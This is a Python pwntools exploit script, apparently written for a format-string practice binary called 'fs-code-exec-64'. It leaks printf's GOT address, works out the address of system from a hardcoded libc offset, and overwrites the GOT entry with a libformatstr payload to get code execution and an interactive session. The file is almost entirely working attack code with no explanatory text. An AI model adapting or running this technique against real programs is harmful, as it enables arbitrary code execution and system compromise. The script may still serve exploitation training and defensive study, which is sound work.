#!/usr/bin/env python

from pwn import *
import sys
sys.path.insert(0, './libformatstr/libformatstr')
from core import FormatStr

context.terminal=['tmux','splitw','-h']
p=process('./fs-code-exec-64')

#gdb.attach(p, "b *main")

addr_of_printf = p.elf.got['printf']
nul = chr(0)

print(hex(addr_of_printf))
print(p.recv())

buf  = '%7$sAAAA'
buf += p64(addr_of_printf + 1)

p.sendline(buf)
p.recvuntil("Hello ")
data = p.recv(5)

data = u64(nul + data + (nul * 2))

# pwndbg> print printf
# $1 = {<text variable, no debug info>} 0x7fd4ccff4800 <__printf>
# pwndbg> print system
# $2 = {<text variable, no debug info>} 0x7fd4ccfe4390 <__libc_system>

offset = 0x7fd4ccff4800 - 0x7fd4ccfe4390

addr_of_sys = data - offset

print("addr_of_sys: %s" % hex(addr_of_sys))

last_four_bytes = addr_of_sys & 0xffffffff
fmt = FormatStr(isx64=1)
fmt[addr_of_printf] = last_four_bytes
payload = fmt.payload(6, start_len=0)

print(repr(payload))

p.sendline(payload)
p.interactive()
